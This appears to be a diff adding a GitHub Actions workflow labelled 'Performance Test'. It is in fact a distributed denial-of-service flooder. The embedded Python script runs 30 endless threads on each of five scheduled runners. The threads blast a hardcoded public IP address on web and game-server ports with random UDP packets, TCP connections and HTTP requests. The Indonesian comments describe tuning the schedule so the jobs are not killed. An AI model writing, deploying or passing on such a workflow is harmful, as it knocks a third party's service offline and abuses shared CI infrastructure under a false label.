@@ -1,0 +1,66 @@
+name: Performance Test
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/10 * * * *'  # neko ubah jadi 10 menit biar gak keburu di-kill
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1,2,3,4,5]  # neko kurangi jadi 5 aja biar stabil
+    steps:
+      - name: Setup
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3 python3-pip
+          pip3 install requests
+      - name: Run Test
+        run: |
+          python3 -c "
+import socket, threading, random, time, requests, sys
+target = '103.126.117.167'
+ports = [80,443,8080,8443,17091,17092,7777]
+
+def worker(thread_id):
+    while True:
+        try:
+            port = random.choice(ports)
+            # UDP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(0.5)
+            s.sendto(random._urandom(1024), (target, port))
+            s.close()
+            
+            # TCP SYN
+            try:
+                t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                t.settimeout(0.3)
+                t.connect((target, port))
+                t.send(b'GET / HTTP/1.1\r\n\r\n')
+                t.close()
+            except:
+                pass
+                
+            # HTTP
+            try:
+                requests.get(f'http://{target}:{port}', timeout=0.2)
+            except:
+                pass
+                
+        except Exception as e:
+            # neko handle error biar gak berhenti
+            pass
+        time.sleep(random.uniform(0.01, 0.05))
+
+# mulai 30 thread per node
+for i in range(30):
+    threading.Thread(target=worker, args=(i,), daemon=True).start()
+
+# keep alive
+while True:
+    time.sleep(60)
+    print(f'[Node {sys.argv[1] if len(sys.argv)>1 else 0}] Still running...')
+"
